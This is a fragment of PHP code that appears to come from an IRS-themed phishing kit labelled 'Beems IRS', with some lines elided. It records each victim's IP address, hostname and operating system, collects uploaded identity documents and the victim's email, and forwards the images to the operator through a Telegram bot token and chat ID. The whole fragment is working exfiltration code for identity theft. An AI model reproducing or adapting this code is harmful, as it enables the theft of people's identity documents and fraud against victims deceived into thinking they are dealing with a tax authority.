...
$VictimInfo1 = "| Submitted by : " . $ip . " (" . gethostbyaddr($ip) . ")";
    ...
    $VictimInfo5 = "| Os : " . $os . "";
if(isset($_POST['docs_slf'])&&isset($_POST['images'])){
    function upImg($vl){
        $t=microtime(true);
    ...
    $message = "+ -------- [ ⚡ Beems IRS ⚡ ] -----------+\n";
    $message .="| 🆔 IRS DOCS Details \n";
    $message .="| ID OF USER : $emaildress\n";
    $message .="| Docs OF : {$_SESSION['doc_type']}\n";
    $caption = "| 🆔 IRS DOCS Details \n";
    $caption = "+ -------- [ ⚡ Bems IRS ⚡ ] -----------+\n";
    $caption .="| DOCS OF USER : $emaildress\n";
    ...
    for($i=0;$i<count($_POST['images']);$i++){
        ...
        kirim_tele_docs($telegram_bot_token, $telegram_chat_id, "../..".upImg($_POST['images'][$i]), $caption);
